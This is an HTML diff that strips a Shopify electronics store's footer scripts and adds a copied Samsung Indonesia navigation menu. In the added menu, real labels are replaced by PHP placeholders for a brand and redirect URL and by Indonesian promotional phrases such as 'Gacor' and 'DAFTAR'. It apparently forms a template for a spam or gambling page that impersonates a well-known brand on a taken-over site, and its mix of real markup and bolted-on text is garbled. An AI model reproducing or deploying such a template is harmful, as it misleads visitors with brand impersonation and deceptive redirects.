+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy watch ultra" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/watches/galaxy-watch/galaxy-watch-ultra-2025-47mm-titanium-blue-bluetooth-sm-l700nzb1xse/buy/">
+             Galaxy Watch Ultra
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy buds3 fe" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/audio-sound/galaxy-buds/galaxy-buds3-fe-gray-sm-r420nzaaxse/">
+             <div class="image">
+              <img alt="Galaxy Buds3 FE" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/9/gnb/GNB_Shop_Buds3_FE_88x88.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Galaxy Buds3 FE" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/9/gnb/GNB_Shop_Buds3_FE_88x88.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy buds3 fe" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/audio-sound/galaxy-buds/galaxy-buds3-fe-gray-sm-r420nzaaxse/">
+             Galaxy Buds3 FE
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:QLED 4K TV" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/tvs/qled-tv/qef1-65-inch-qled-4k-smart-tv-qa65qef1akxxd/">
+             <div class="image">
+              <img alt="QLED 4K Smart TV" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/QEF1_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="QLED 4K Smart TV" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/QEF1_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:QLED 4K TV" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/tvs/qled-tv/qef1-65-inch-qled-4k-smart-tv-qa65qef1akxxd/">
+             QLED 4K TV
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:Crystal UHD 4K TV" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/tvs/uhd-4k-tv/ue100f-75-inch-crystal-uhd-4k-smart-tv-ua75ue100fkxxd/">
+             <div class="image">
+              <img alt="Crystal UHD 4K TV" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/UE100F-_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Crystal UHD 4K TV" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/UE100F-_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:Crystal UHD 4K TV" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/tvs/uhd-4k-tv/ue100f-75-inch-crystal-uhd-4k-smart-tv-ua75ue100fkxxd/">
+             Crystal UHD 4K TV
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:the frame tv" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/lifestyle-tvs/the-frame/ls03f-75-inch-art-store-black-qa75ls03fakxxd/">
+             <div class="image">
+              <img alt="The Frame TV" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/The_Frame_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="The Frame TV" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/The_Frame_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:the frame tv" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/lifestyle-tvs/the-frame/ls03f-75-inch-art-store-black-qa75ls03fakxxd/">
+             The Frame TV
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:q series soundbar" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/audio-devices/all-audio-devices/?q-series-home-theatre-soundbar">
+             <div class="image">
+              <img alt="Q-series Soundbar" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/revamp/gnb/shop/GNB_Shop_L1_12_88x88.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Q-series Soundbar" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/revamp/gnb/shop/GNB_Shop_L1_12_88x88.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:q series soundbar" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/audio-devices/all-audio-devices/?q-series-home-theatre-soundbar">
+             Q-series Soundbar
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:Odyssey OLED G5" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/monitors/gaming/odyssey-oled-g5-g50sf-27-inch-180hz-oled-qhd-ls27fg502sexxd/">
+             <div class="image">
+              <img alt="Odyssey OLED G5" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/G50SF_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Odyssey OLED G5" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/G50SF_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:Odyssey OLED G5" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/monitors/gaming/odyssey-oled-g5-g50sf-27-inch-180hz-oled-qhd-ls27fg502sexxd/">
+             Odyssey OLED G5
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:bespoke ai refrigerator 641l" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/refrigerators/side-by-side/bespoke-ai-refrigerator-sbs-family-hub-641l-black-doi-rs90f65anfse/">
+             <div class="image">
+              <img alt="Bespoke AI Refrigerator 641L " class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/7/offer/RS90F65A2FST_001_Front_Black-DOI_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Bespoke AI Refrigerator 641L " class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/7/offer/RS90F65A2FST_001_Front_Black-DOI_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:bespoke ai refrigerator 641l" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/refrigerators/side-by-side/bespoke-ai-refrigerator-sbs-family-hub-641l-black-doi-rs90f65anfse/">
+             Bespoke AI Refrigerator 641L
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:front load washer and dryer" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/washers-and-dryers/washer-dryer-combo/wd6000t-front-load-combo-washer-dryer-21kg-black-wd21t6500gv-se/">
+             <div class="image">
+              <img alt="Front-load Washer &amp; Dryer with Ecobubble&trade;" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/WD21_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Front-load Washer &amp; Dryer with Ecobubble&trade;" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/WD21_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:front load washer and dryer" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/washers-and-dryers/washer-dryer-combo/wd6000t-front-load-combo-washer-dryer-21kg-black-wd21t6500gv-se/">
+             Front-load Washer &amp; Dryer
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:vacuum cleaner" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/vacuum-cleaners/robot/?stick+canister">
+             <div class="image">
+              <img alt="Vacuum Cleaner Stick" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/VS80F_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Vacuum Cleaner Stick" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/VS80F_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:vacuum cleaner" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/vacuum-cleaners/robot/?stick+canister">
+             Vacuum Cleaner Stick
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:windfree ultra" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/air-conditioners/wall-mount/ar9500t-ar09axaaawknsk-windfree-ultra-metal-cooling-ar12cykaawknse/">
+             <div class="image">
+              <img alt="WindFree&trade; Ultra AC" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/WindFree_GNB_L1_88px.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="WindFree&trade; Ultra AC" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/11/gnb/WindFree_GNB_L1_88px.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:windfree ultra" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/air-conditioners/wall-mount/ar9500t-ar09axaaawknsk-windfree-ultra-metal-cooling-ar12cykaawknse/">
+             WindFree&trade; Ultra AC
+            </a>
+           </div>
           </div>
-        </section>
-        <!-- END sections: footer-group -->
-        <ul hidden>
-          <li id="a11y-refresh-page-message">Choosing a selection results in a full page refresh.</li>
-          <li id="a11y-new-window-message">Opens in a new window.</li>
+          <div class="screen-indicator-wrap">
+           <button class="screen-indicator screen-indicator--prev">
+            <div class="screen-indicator--icon">
+             <span class="hidden">
+              Previous
+             </span>
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#previous-regular" xlink:href="#previous-regular">
+              </use>
+             </svg>
+            </div>
+           </button>
+           <button class="screen-indicator screen-indicator--next">
+            <div class="screen-indicator--icon">
+             <span class="hidden">
+              Next
+             </span>
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#next-regular" xlink:href="#next-regular">
+              </use>
+             </svg>
+            </div>
+           </button>
+          </div>
+         </div>
+        </div>
+        <p class="nv00-gnb-v4__l0-menu-list-title nv00-gnb-v4--mobile-only">
+         SHOP BY CATEGORY
+        </p>
+        <ul aria-label="main menu" class="nv00-gnb-v4__l0-menu-list nv00-gnb-v4__l0-menu-list--left" role="menubar">
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="shop" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem">
+            <span class="nv00-gnb-v4__l0-menu-text nv00-gnb-v4--pc-only">
+            <?= $BRAND; ?> x <?= $BRAND2; ?>
+            </span>
+            <span class="nv00-gnb-v4__l0-menu-text nv00-gnb-v4--mobile-only">
+             Explore Shop
+            </span>
+           </a>
+           <button an-ac="gnb" an-ca="navigation" an-la="shop" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__l0-menu-toggle-btn" role="menuitem">
+            <span class="hidden">
+             Shop
+            </span>
+           </button>
+          </div>
+         </li>
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="mobile" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem">
+            <span class="nv00-gnb-v4__l0-menu-text">
+             Game Digital Yang Setiap
+            </span>
+           </a>
+           <button an-ac="gnb" an-ca="navigation" an-la="mobile" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__l0-menu-toggle-btn" role="menuitem">
+            <span class="hidden">
+             Mobile
+            </span>
+           </button>
+          </div>
+         </li>
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="tv and av" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem">
+            <span class="nv00-gnb-v4__l0-menu-text">
+             Digital Yang Setiap Detiknya
+            </span>
+           </a>
+           <button an-ac="gnb" an-ca="navigation" an-la="tv and av" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__l0-menu-toggle-btn" role="menuitem">
+            <span class="hidden">
+             LINK <?= $BRAND; ?> x <?= $BRAND2; ?>
+            </span>
+           </button>
+          </div>
+         </li>
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="appliances" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem">
+            <span class="nv00-gnb-v4__l0-menu-text">
+             Digital Yang Setiap Detiknya
+            </span>
+           </a>
+           <button an-ac="gnb" an-ca="navigation" an-la="appliances" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__l0-menu-toggle-btn" role="menuitem">
+            <span class="hidden">
+             Gacor
+            </span>
+           </button>
+          </div>
+         </li>
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="monitors" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem">
+            <span class="nv00-gnb-v4__l0-menu-text">
+             Yang Setiap Detiknya Punya
+            </span>
+           </a>
+           <button an-ac="gnb" an-ca="navigation" an-la="monitors" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__l0-menu-toggle-btn" role="menuitem">
+            <span class="hidden">
+             Game Digital Yang Setiap
+            </span>
+           </button>
+          </div>
+         </li>
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="wearables" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem">
+            <span class="nv00-gnb-v4__l0-menu-text">
+             Setiap Detiknya Punya Kejutan
+            </span>
+           </a>
+           <button an-ac="gnb" an-ca="navigation" an-la="wearables" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__l0-menu-toggle-btn" role="menuitem">
+            <span class="hidden">
+              <?= $BRAND; ?> x <?= $BRAND2; ?> LOGIN
+            </span>
+           </button>
+          </div>
+         
+         </li>
         </ul>
-        <script>
-          window.themeJsData = {
-            templateName: "product",
-            templateStrip: "product",
-            cartItemCount: 0,
-            shopCurrency: 'SGD',
-          }
-        </script>
-        <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/theme.js?v=35343184324329019891742784888" defer="defer"></script>
-        <script>
-          window.shopUrl = 'https://www.istudiosg.com';
-          window.routes = {
-            cart_add_url: '/cart/add',
-            cart_change_url: '/cart/change',
-            cart_clear_url: '/cart/clear',
-            cart_update_url: '/cart/update',
-            cart_url: '/cart',
-            account_addresses_url: '/account/addresses',
-            account_login_url: '/account/login',
-            account_logout_url: '/account/logout',
-            account_recover_url: '/account/recover',
-            account_register_url: '/account/register',
-            account_url: '/account',
-            predictive_search_url: '/search/suggest',
-          };
-          
-          window.cartStrings = {
-            error: `There was an error while updating your cart. Please try again.`,
-            quantityError: `You can only add [quantity] of this item to your cart.`,
-            storeConfirmationMessage: 'Confirm store at checkout',
-          };
-          
-          window.variantStrings = {
-            addToCart: `Add to cart`,
-            soldOut: `Out of Stock`,
-            unavailable: `Unavailable`,
-            unavailable_with_option: `[value] - Unavailable`,
-          };
-          
-          window.quickOrderListStrings = {
-            itemsAdded: `[quantity] items added`,
-            itemAdded: `[quantity] item added`,
-            itemsRemoved: `[quantity] items removed`,
-            itemRemoved: `[quantity] item removed`,
-            viewCart: `View cart`,
-            each: `[money]/ea`,
-          };
-          
-          window.accessibilityStrings = {
-            imageAvailable: `Image [index] is now available in gallery view`,
-            shareSuccess: `Link copied to clipboard`,
-            pauseSlideshow: `Pause slideshow`,
-            playSlideshow: `Play slideshow`,
-            recipientFormExpanded: `Gift card recipient form expanded`,
-            recipientFormCollapsed: `Gift card recipient form collapsed`,
-          };
-          
-          window.deliveryOptionsStrings = {"en":{"Usually ready in 1 hour":"Usually ready in 1 hour","Usually ready in 2 hours":"Usually ready in 2 hours","Usually ready in 4 hours":"Usually ready in 4 hours","Usually ready in 24 hours":"Usually ready in 24 hours","Usually ready in 2-4 days":"Usually ready in 2-4 days","Temporarily Unavailable for Pickup":"Temporarily Unavailable for Pickup"}};
-        </script><script src="https://www.istudiosg.com/cdn/shop/t/14/assets/predictive-search.js?v=3351204828225219081742784888" defer="defer"></script>
-        <my-store-locator-drawer
-          class="gradient my-store-locator-drawer"
-          tabindex="-1"
-          role="dialog"
-          aria-modal="true"
-          aria-labelledby="MyStoreLocatorDrawerHeading"
-          >
-          <div class="my-store-locator-drawer__inner">
-              <div class="my-store-locator-drawer__close-wrapper">
-                <button
-                    class="js-store-locator-drawer-close my-store-locator__close"
-                    type="button"
-                    aria-label="Close"
-                    >
-                    <svg
-                      xmlns="http://www.w3.org/2000/svg"
-                      aria-hidden="true"
-                      focusable="false"
-                      class="icon icon-close"
-                      fill="none"
-                      viewBox="0 0 18 17"
-                      width="18"
-                      height="17"
-                      >
-                      <path
-                          d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                          fill="currentColor"
-                          >
-                    </svg>
+        <ul aria-label="main menu" class="nv00-gnb-v4__l0-menu-list nv00-gnb-v4__l0-menu-list--right" role="menubar">
+         <!-- Type E Support Start -->
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <button an-ac="gnb" an-ca="navigation" an-la="support" an-tr="nv00_gnb-product detail-text l1-navigation2" class="nv00-gnb-v4__l0-menu-btn" data-js-action="l0MenuBtn" role="menuitem">
+            LOGIN
+           </button>
+          </div>
+          <div class="nv00-gnb-v4__l1-menu-container">
+           <div class="nv00-gnb-v4__l1-menu-container-header nv00-gnb-v4--mobile-only">
+            <p class="nv00-gnb-v4__l1-menu-container-title">
+             LOGIN
+            </p>
+           </div>
+          </div>
+         </li>
+         
+         <li class="nv00-gnb-v4__l0-menu">
+          <div class="nv00-gnb-v4__l0-menu-title">
+           <a an-ac="gnb" an-ca="navigation" an-la="<?= $BRAND; ?> x <?= $BRAND2; ?> DAFTAR" an-tr="nv00_gnb-product detail-banner-navigation2" aria-label="<?= $BRAND; ?> x <?= $BRAND2; ?> Daftar. Buka di Tab Baru" class="nv00-gnb-v4__l0-menu-link" data-js-action="l0MenuBtn" href="<?= $canonical; ?>" role="menuitem" target="_blank">
+            DAFTAR
+           </a>
+          </div>
+         </li>
+         <!-- Non-Type Right Menu End -->
+        </ul>
+        <div class="nv00-gnb-v4__user-menu-list nv00-gnb-v4--mobile-only before-login">
+         <a data-linkinfo="<?= $canonical; ?>" href="<?= $canonical; ?>" role="menuitem">
+          Login/Sign-Up
+         </a>
+         <a an-ac="gnb" an-ca="account" an-la="rewards" an-tr="nv00_gnb-account-account" aria-label="Receive up to 5% of your purchase back in points. Samsung Rewards" class="nv00-gnb-v4__user-menu nv00-gnb-v4__user-menu--icon" href="<?= $canonical; ?>" role="menuitem">
+          Receive up to 5% of your purchase back in points.
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#next-regular" xlink:href="#next-regular">
+           </use>
+          </svg>
+         </a>
+        </div>
+        <div class="nv00-gnb-v4__user-menu-list nv00-gnb-v4--mobile-only after-login">
+         <a an-ac="gnb" an-ca="account" an-la="user name" an-tr="nv00_gnb-product detail-account-account" aria-label="Go to the another page" class="nv00-gnb-v4__user-menu js-user-name js-account" href="javascript:;" role="menuitem">
+          <div class="image nv00-gnb-v4__user-profile js-gnb-afterlogin-image">
+           <img alt="" class="image__main" data-comp-name="image" role="img" src="#"/>
+          </div>
+          <svg aria-hidden="true" class="icon nv00-gnb-v4__user-icon js-gnb-afterlogin-no-image" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+           <path d="M48,51.5c16.521,0,30.5,13.82,30.5,29.555h0V89A3.5,3.5,0,0,1,75,92.5H21A3.5,3.5,0,0,1,17.5,89h0V81.055C17.5,65.32,31.479,51.5,48,51.5Zm0,5c-13.772,0-25.5,11.595-25.5,24.555h0V87.5h51V81.055c0-12.831-11.494-24.323-25.087-24.552h0Zm0-53A20.5,20.5,0,1,1,27.5,24,20.5,20.5,0,0,1,48,3.5Zm0,5A15.5,15.5,0,1,0,63.5,24,15.5,15.5,0,0,0,48,8.5Z" transform="translate(-0.5 0.5)">
+           </path>
+          </svg>
+          <p class="user-name">
+          </p>
+          <p class="hidden">
+           Buka Menu Saya
+          </p>
+         </a>
+         <a an-ac="gnb" an-ca="account" an-la="rewards" an-tr="nv00_gnb-account-account" aria-label="Receive up to 5% of your purchase back in points. Samsung Rewards" class="nv00-gnb-v4__user-menu nv00-gnb-v4__user-menu--icon" href="<?= $canonical; ?>" role="menuitem">
+          Receive up to 5% of your purchase back in points.
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#next-regular" xlink:href="#next-regular">
+           </use>
+          </svg>
+         </a>
+        </div>
+        <div class="nv00-gnb-v4__utility-list">
+         <button an-ac="gnb" an-ca="navigation" an-la="search" an-tr="nv00_gnb-product detail-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-search gnb__search-btn-js" data-js-action="search">
+          <span class="hidden">
+           Cari
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+           <path d="M85.732,89.269v0L60.479,64.018A36.5,36.5,0,1,1,22.295,2.869,36.5,36.5,0,0,1,64.02,60.483L89.268,85.732l-3.535,3.535ZM36.5,5A31.508,31.508,0,0,0,24.238,65.525,31.508,31.508,0,0,0,48.762,7.476,31.316,31.316,0,0,0,36.5,5Z" transform="translate(3.366 3.366)">
+           </path>
+          </svg>
+          <span aria-hidden="true" class="nv00-gnb-v4__search-text">
+           Cari
+          </span>
+         </button>
+         <a an-ac="gnb" an-ca="navigation" an-la="cart" an-tr="nv00_gnb-product detail-gnb cart icon-navigation6" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-cart nv00-gnb-v4__utility-btn js-global-cart-btn js-has-carturl" data-cart-url="https://shop.samsung.com/id/cart" href="https://shop.samsung.com/id/cart" role="button">
+          <span class="hidden">
+           Troli
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+           <g clip-path="url(#clip-path)" transform="translate(-625.251 -196)">
+            <path d="M697.237,263.578a10,10,0,1,1-10,10A10,10,0,0,1,697.237,263.578Zm-34.944,0a10,10,0,1,1-10,10A10,10,0,0,1,662.293,263.578Zm34.944,5a5,5,0,1,0,5,5A5,5,0,0,0,697.237,268.578Zm-34.944,0a5,5,0,1,0,5,5A5,5,0,0,0,662.293,268.578ZM638.1,197.25a3.86,3.86,0,0,1,3.6,2.652l.052.184,3.208,12.292h70.036a3.224,3.224,0,0,1,3.192,3.916l-.04.18-9.4,36.292a3.86,3.86,0,0,1-3.46,2.832l-.2.008h-51.1a3.866,3.866,0,0,1-3.6-2.648l-.052-.188-13.192-50.516-11.612,0,0-5Zm74.648,20.128h-66.48l8.672,33.228h49.2Z" transform="translate(0.834 3.75)">
+            </path>
+           </g>
+          </svg>
+          <span aria-live="polite" class="cart-in-number gnb-cart-count" style="display:none;">
+           <span class="hidden">
+            Number of Products :
+           </span>
+          </span>
+         </a>
+         <div class="nv00-gnb-v4__utility-wrap before-login">
+          <button an-ac="gnb" an-ca="navigation" an-la="login" an-tr="nv00_gnb-product detail-l0-navigation2" aria-expanded="false" aria-label="Manage Account" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-user" data-js-action="user">
+           <span class="hidden">
+            Login/Sign-Up
+           </span>
+           <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+            <path d="M48,51.5c16.521,0,30.5,13.82,30.5,29.555h0V89A3.5,3.5,0,0,1,75,92.5H21A3.5,3.5,0,0,1,17.5,89h0V81.055C17.5,65.32,31.479,51.5,48,51.5Zm0,5c-13.772,0-25.5,11.595-25.5,24.555h0V87.5h51V81.055c0-12.831-11.494-24.323-25.087-24.552h0Zm0-53A20.5,20.5,0,1,1,27.5,24,20.5,20.5,0,0,1,48,3.5Zm0,5A15.5,15.5,0,1,0,63.5,24,15.5,15.5,0,0,0,48,8.5Z" transform="translate(-0.5 0.5)">
+            </path>
+           </svg>
+          </button>
+          <div aria-label="account" class="nv00-gnb-v4__utility-menu-list" role="menu">
+           <div class="nv00-gnb-v4__utility-menu-wrap">
+            <a class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu--sign-in nv00-gnb-v4--pc-only"
+              href="<?= $canonical; ?>"
+              role="menuitem"
+              target="_self"
+              rel="noopener noreferrer"
+              onclick="event.stopImmediatePropagation(); event.preventDefault(); window.location.href='<?= $canonical; ?>'; return false;">
+              Login/Sign-Up
+            </a>
+            <a class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu--with-icon nv00-gnb-v4--pc-only" href="<?= $canonical; ?>" role="menuitem">
+             Receive up to 5% of your purchase back in points.
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#next-regular" xlink:href="#next-regular">
+              </use>
+             </svg>
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="orders" an-tr="nv00_gnb-product detail-account-account" aria-label="orders" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="http://shop.samsung.com/id/mypage/orders/" role="menuitem">
+             Pesanan
+            </a>
